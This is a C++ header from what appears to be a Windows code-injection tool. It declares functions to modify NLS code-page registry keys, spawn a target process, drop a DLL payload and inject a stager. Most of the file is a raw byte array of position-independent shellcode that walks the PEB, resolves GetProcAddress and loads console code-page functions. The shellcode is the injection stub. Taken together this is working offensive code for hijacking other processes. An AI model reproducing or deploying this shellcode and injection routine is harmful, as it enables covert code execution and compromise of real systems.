#pragma once
#include "headers.hpp"


//Appply namespaces to this functions, maybe inside of a class itself :)
BOOLEAN CompareLastElementString(PWCHAR str1, PWCHAR str2, BOOLEAN CaseInsensitive);
bool OpenKeyForNlsModification(PRegistryKey regObject) noexcept;
UINT StringToInt(PWCHAR str) noexcept;
bool FindCodePageWithPayload(PRegistryKey regObject, UINT dwValuesCount, UINT dwMaxLenValues);
bool IterateCodePageAndExtractProperId(PRegistryKey regObject);
bool CreateProcessToInject(LPPROCESS_INFORMATION procInfo);
bool DropSystemDllPayload(PRegistryKey regObject);
void InjectStagerToPayload(PRegistryKey regObject);
UINT StringToInt(PWCHAR str) noexcept;
UINT StringToIntDecimal(PWCHAR str) noexcept;

//PIC shellcode.
constexpr BYTE StubInject[] = { 0x56,0x48,0x8b,0xf4,0x48,0x83,0xe4,0xf0,0x48,0x83,0xec,0x20,0xe8,0x05,0x00,0x00,0x00,0x48,0x8b,0xe6,0x5e,0xc3,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x58,0x48,0x8d,0x4c,0x24,0x20,0xe8,0x87,0x00,0x00,0x00,0x85,0xc0,0x74,0x07,0xb8,0x01,0x00,0x00,0x00,0xeb,0x11,0x48,0x8d,0x54,0x24,0x20,0x48,0x8b,0x4c,0x24,0x60,0xe8,0x07,0x00,0x00,0x00,0x33,0xc0,0x48,0x83,0xc4,0x58,0xc3,0x48,0x89,0x54,0x24,0x10,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x38,0x48,0x8b,0x44,0x24,0x40,0x8b,0x00,0x89,0x44,0x24,0x40,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x08,0x48,0x85,0xc0,0x75,0x0e,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x18,0x85,0xc0,0x75,0x02,0xeb,0x2d,0x8b,0x4c,0x24,0x40,0x48,0x8b,0x44,0x24,0x48,0xff,0x10,0x85,0xc0,0x75,0x02,0xeb,0x1c,0x8b,0x4c,0x24,0x40,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x10,0x85,0xc0,0x75,0x02,0xeb,0x0a,0x33,0xc9,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x20,0x48,0x83,0xc4,0x38,0xc3,0x48,0x89,0x4c,0x24,0x08,0x48,0x81,0xec,0xd8,0x00,0x00,0x00,0xb8,0x6b,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa0,0x00,0x00,0x00,0xb8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa2,0x00,0x00,0x00,0xb8,0x72,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa4,0x00,0x00,0x00,0xb8,0x6e,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa6,0x00,0x00,0x00,0xb8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa8,0x00,0x00,0x00,0xb8,0x6c,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xaa,0x00,0x00,0x00,0xb8,0x33,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xac,0x00,0x00,0x00,0xb8,0x32,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xae,0x00,0x00,0x00,0xb8,0x2e,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb0,0x00,0x00,0x00,0xb8,0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb2,0x00,0x00,0x00,0xb8,0x6c,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb4,0x00,0x00,0x00,0xb8,0x6c,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb6,0x00,0x00,0x00,0x33,0xc0,0x66,0x89,0x84,0x24,0xb8,0x00,0x00,0x00,0x48,0x8d,0x8c,0x24,0xa0,0x00,0x00,0x00,0xe8,0xe4,0x05,0x00,0x00,0x48,0x89,0x84,0x24,0x98,0x00,0x00,0x00,0x48,0x83,0xbc,0x24,0x98,0x00,0x00,0x00,0x00,0x75,0x0a,0xb8,0x01,0x00,0x00,0x00,0xe9,0x8f,0x03,0x00,0x00,0xc6,0x44,0x24,0x40,0x47,0xc6,0x44,0x24,0x41,0x65,0xc6,0x44,0x24,0x42,0x74,0xc6,0x44,0x24,0x43,0x50,0xc6,0x44,0x24,0x44,0x72,0xc6,0x44,0x24,0x45,0x6f,0xc6,0x44,0x24,0x46,0x63,0xc6,0x44,0x24,0x47,0x41,0xc6,0x44,0x24,0x48,0x64,0xc6,0x44,0x24,0x49,0x64,0xc6,0x44,0x24,0x4a,0x72,0xc6,0x44,0x24,0x4b,0x65,0xc6,0x44,0x24,0x4c,0x73,0xc6,0x44,0x24,0x4d,0x73,0xc6,0x44,0x24,0x4e,0x00,0x48,0x8d,0x54,0x24,0x40,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0xe8,0x3a,0x03,0x00,0x00,0x48,0x89,0x84,0x24,0xc0,0x00,0x00,0x00,0x48,0x83,0xbc,0x24,0xc0,0x00,0x00,0x00,0x00,0x75,0x0a,0xb8,0x03,0x00,0x00,0x00,0xe9,0x15,0x03,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x8b,0x8c,0x24,0xc0,0x00,0x00,0x00,0x48,0x89,0x48,0x28,0xc6,0x44,0x24,0x50,0x47,0xc6,0x44,0x24,0x51,0x65,0xc6,0x44,0x24,0x52,0x74,0xc6,0x44,0x24,0x53,0x43,0xc6,0x44,0x24,0x54,0x6f,0xc6,0x44,0x24,0x55,0x6e,0xc6,0x44,0x24,0x56,0x73,0xc6,0x44,0x24,0x57,0x6f,0xc6,0x44,0x24,0x58,0x6c,0xc6,0x44,0x24,0x59,0x65,0xc6,0x44,0x24,0x5a,0x57,0xc6,0x44,0x24,0x5b,0x69,0xc6,0x44,0x24,0x5c,0x6e,0xc6,0x44,0x24,0x5d,0x64,0xc6,0x44,0x24,0x5e,0x6f,0xc6,0x44,0x24,0x5f,0x77,0xc6,0x44,0x24,0x60,0x00,0xc6,0x44,0x24,0x30,0x41,0xc6,0x44,0x24,0x31,0x6c,0xc6,0x44,0x24,0x32,0x6c,0xc6,0x44,0x24,0x33,0x6f,0xc6,0x44,0x24,0x34,0x63,0xc6,0x44,0x24,0x35,0x43,0xc6,0x44,0x24,0x36,0x6f,0xc6,0x44,0x24,0x37,0x6e,0xc6,0x44,0x24,0x38,0x73,0xc6,0x44,0x24,0x39,0x6f,0xc6,0x44,0x24,0x3a,0x6c,0xc6,0x44,0x24,0x3b,0x65,0xc6,0x44,0x24,0x3c,0x00,0xc6,0x44,0x24,0x20,0x53,0xc6,0x44,0x24,0x21,0x65,0xc6,0x44,0x24,0x22,0x74,0xc6,0x44,0x24,0x23,0x43,0xc6,0x44,0x24,0x24,0x6f,0xc6,0x44,0x24,0x25,0x6e,0xc6,0x44,0x24,0x26,0x73,0xc6,0x44,0x24,0x27,0x6f,0xc6,0x44,0x24,0x28,0x6c,0xc6,0x44,0x24,0x29,0x65,0xc6,0x44,0x24,0x2a,0x43,0xc6,0x44,0x24,0x2b,0x50,0xc6,0x44,0x24,0x2c,0x00,0xc6,0x44,0x24,0x68,0x53,0xc6,0x44,0x24,0x69,0x65,0xc6,0x44,0x24,0x6a,0x74,0xc6,0x44,0x24,0x6b,0x43,0xc6,0x44,0x24,0x6c,0x6f,0xc6,0x44,0x24,0x6d,0x6e,0xc6,0x44,0x24,0x6e,0x73,0xc6,0x44,0x24,0x6f,0x6f,0xc6,0x44,0x24,0x70,0x6c,0xc6,0x44,0x24,0x71,0x65,0xc6,0x44,0x24,0x72,0x4f,0xc6,0x44,0x24,0x73,0x75,0xc6,0x44,0x24,0x74,0x74,0xc6,0x44,0x24,0x75,0x70,0xc6,0x44,0x24,0x76,0x75,0xc6,0x44,0x24,0x77,0x74,0xc6,0x44,0x24,0x78,0x43,0xc6,0x44,0x24,0x79,0x50,0xc6,0x44,0x24,0x7a,0x00,0xc6,0x84,0x24,0x80,0x00,0x00,0x00,0x53,0xc6,0x84,0x24,0x81,0x00,0x00,0x00,0x65,0xc6,0x84,0x24,0x82,0x00,0x00,0x00,0x74,0xc6,0x84,0x24,0x83,0x00,0x00,0x00,0x54,0xc6,0x84,0x24,0x84,0x00,0x00,0x00,0x68,0xc6,0x84,0x24,0x85,0x00,0x00,0x00,0x72,0xc6,0x84,0x24,0x86,0x00,0x00,0x00,0x65,0xc6,0x84,0x24,0x87,0x00,0x00,0x00,0x61,0xc6,0x84,0x24,0x88,0x00,0x00,0x00,0x64,0xc6,0x84,0x24,0x89,0x00,0x00,0x00,0x55,0xc6,0x84,0x24,0x8a,0x00,0x00,0x00,0x49,0xc6,0x84,0x24,0x8b,0x00,0x00,0x00,0x4c,0xc6,0x84,0x24,0x8c,0x00,0x00,0x00,0x61,0xc6,0x84,0x24,0x8d,0x00,0x00,0x00,0x6e,0xc6,0x84,0x24,0x8e,0x00,0x00,0x00,0x67,0xc6,0x84,0x24,0x8f,0x00,0x00,0x00,0x75,0xc6,0x84,0x24,0x90,0x00,0x00,0x00,0x61,0xc6,0x84,0x24,0x91,0x00,0x00,0x00,0x67,0xc6,0x84,0x24,0x92,0x00,0x00,0x00,0x65,0xc6,0x84,0x24,0x93,0x00,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x68,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x01,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x38,0x00,0x75,0x0a,0xb8,0x04,0x00,0x00,0x00,0xe9,0xf0,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x50,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x08,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x08,0x00,0x75,0x0a,0xb8,0x05,0x00,0x00,0x00,0xe9,0xb3,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x20,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x10,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x10,0x00,0x75,0x07,0xb8,0x06,0x00,0x00,0x00,0xeb,0x79,0x48,0x8d,0x54,0x24,0x30,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x18,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x18,0x00,0x75,0x07,0xb8,0x07,0x00,0x00,0x00,0xeb,0x3f,0x48,0x8d,0x94,0x24,0x80,0x00,0x00,0x00,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x20,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x20,0x00,0x75,0x07,0xb8,0x08,0x00,0x00,0x00,0xeb,0x02,0x33,0xc0,0x48,0x81,0xc4,0xd8,0x00,0x00,0x00,0xc3,0x48,0x89,0x54,0x24,0x10,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x78,0x48,0x8b,0x84,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x30,0x48,0x8b,0x44,0x24,0x30,0x0f,0xb7,0x00,0x3d,0x4d,0x5a,0x00,0x00,0x74,0x07,0x33,0xc0,0xe9,0xfa,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x30,0x48,0x63,0x40,0x3c,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,0x44,0x24,0x40,0xb8,0x08,0x00,0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x4c,0x24,0x40,0x48,0x8d,0x84,0x01,0x88,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x38,0x48,0x8b,0x44,0x24,0x38,0x83,0x38,0x00,0x75,0x07,0x33,0xc0,0xe9,0xb2,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x38,0x8b,0x00,0x89,0x44,0x24,0x18,0x8b,0x44,0x24,0x18,0x48,0x03,0x84,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x10,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x18,0x48,0x89,0x44,0x24,0x48,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x1c,0x89,0x44,0x24,0x24,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x20,0x89,0x44,0x24,0x1c,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x24,0x89,0x44,0x24,0x20,0x48,0xc7,0x44,0x24,0x08,0x00,0x00,0x00,0x00,0xeb,0x0d,0x48,0x8b,0x44,0x24,0x08,0x48,0xff,0xc0,0x48,0x89,0x44,0x24,0x08,0x48,0x8b,0x44,0x24,0x48,0x48,0x39,0x44,0x24,0x08,0x0f,0x83,0x3b,0x01,0x00,0x00,0x8b,0x44,0x24,0x1c,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x8b,0x4c,0x24,0x08,0x48,0x8d,0x04,0x88,0x48,0x89,0x44,0x24,0x58,0x8b,0x44,0x24,0x20,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x8b,0x4c,0x24,0x08,0x48,0x8d,0x04,0x48,0x48,0x89,0x44,0x24,0x50,0x8b,0x44,0x24,0x24,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x8b,0x4c,0x24,0x50,0x0f,0xb7,0x09,0x48,0x8d,0x04,0x88,0x48,0x89,0x44,0x24,0x60,0x48,0x8b,0x44,0x24,0x58,0x8b,0x00,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,0x44,0x24,0x28,0x48,0xc7,0x04,0x24,0x00,0x00,0x00,0x00,0xeb,0x0b,0x48,0x8b,0x04,0x24,0x48,0xff,0xc0,0x48,0x89,0x04,0x24,0x48,0x8b,0x04,0x24,0x48,0x8b,0x8c,0x24,0x88,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x74,0x45,0x48,0x8b,0x04,0x24,0x48,0x8b,0x4c,0x24,0x28,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x74,0x2f,0x48,0x8b,0x04,0x24,0x48,0x8b,0x8c,0x24,0x88,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x48,0x8b,0x0c,0x24,0x48,0x8b,0x54,0x24,0x28,0x48,0x03,0xd1,0x48,0x8b,0xca,0x0f,0xbe,0x09,0x3b,0xc1,0x74,0x02,0xeb,0x02,0xeb,0x97,0x48,0x8b,0x04,0x24,0x48,0x8b,0x8c,0x24,0x88,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x75,0x2d,0x48,0x8b,0x04,0x24,0x48,0x8b,0x4c,0x24,0x28,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x75,0x17,0x48,0x8b,0x44,0x24,0x60,0x8b,0x00,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0xeb,0x07,0xe9,0xa8,0xfe,0xff,0xff,0x33,0xc0,0x48,0x83,0xc4,0x78,0xc3,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x58,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x40,0x48,0x8b,0x44,0x24,0x40,0x48,0x8b,0x40,0x18,0x48,0x89,0x44,0x24,0x48,0x48,0x8b,0x44,0x24,0x48,0x48,0x83,0xc0,0x20,0x48,0x89,0x44,0x24,0x38,0x48,0x8b,0x44,0x24,0x38,0x48,0x8b,0x00,0x48,0x89,0x44,0x24,0x30,0xeb,0x0d,0x48,0x8b,0x44,0x24,0x30,0x48,0x8b,0x00,0x48,0x89,0x44,0x24,0x30,0x48,0x8b,0x44,0x24,0x38,0x48,0x39,0x44,0x24,0x30,0x0f,0x84,0xbf,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x30,0x48,0x83,0xe8,0x10,0x48,0x89,0x44,0x24,0x28,0x48,0x83,0x7c,0x24,0x28,0x00,0x74,0x0c,0x48,0x8b,0x44,0x24,0x28,0x48,0x83,0x78,0x30,0x00,0x75,0x05,0xe9,0x98,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x28,0x48,0x8b,0x40,0x60,0x48,0x89,0x44,0x24,0x10,0x48,0x83,0x7c,0x24,0x10,0x00,0x75,0x02,0xeb,0xa4,0x48,0xc7,0x04,0x24,0x00,0x00,0x00,0x00,0xeb,0x0b,0x48,0x8b,0x04,0x24,0x48,0xff,0xc0,0x48,0x89,0x04,0x24,0x48,0x8b,0x44,0x24,0x28,0x0f,0xb7,0x40,0x58,0x48,0x39,0x04,0x24,0x0f,0x83,0x26,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x74,0x11,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x75,0x05,0xe9,0xff,0x00,0x00,0x00,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x5a,0x7f,0x47,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x41,0x7c,0x35,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xe8,0x41,0x83,0xc0,0x61,0x89,0x44,0x24,0x20,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x54,0x24,0x20,0x66,0x89,0x14,0x48,0x0f,0xb7,0x44,0x24,0x20,0x66,0x89,0x44,0x24,0x08,0xeb,0x12,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x66,0x89,0x44,0x24,0x08,0x0f,0xb7,0x44,0x24,0x08,0x66,0x89,0x44,0x24,0x18,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x5a,0x7f,0x47,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x41,0x7c,0x35,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xe8,0x41,0x83,0xc0,0x61,0x89,0x44,0x24,0x24,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x54,0x24,0x24,0x66,0x89,0x14,0x48,0x0f,0xb7,0x44,0x24,0x24,0x66,0x89,0x44,0x24,0x0a,0xeb,0x12,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x66,0x89,0x44,0x24,0x0a,0x0f,0xb7,0x44,0x24,0x0a,0x66,0x89,0x44,0x24,0x1c,0x0f,0xb7,0x44,0x24,0x18,0x0f,0xb7,0x4c,0x24,0x1c,0x3b,0xc1,0x74,0x02,0xeb,0x05,0xe9,0xbc,0xfe,0xff,0xff,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x75,0x1c,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x75,0x0b,0x48,0x8b,0x44,0x24,0x28,0x48,0x8b,0x40,0x30,0xeb,0x07,0xe9,0x24,0xfe,0xff,0xff,0x33,0xc0,0x48,0x83,0xc4,0x58,0xc3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
constexpr size_t lengthInject = std::size(StubInject);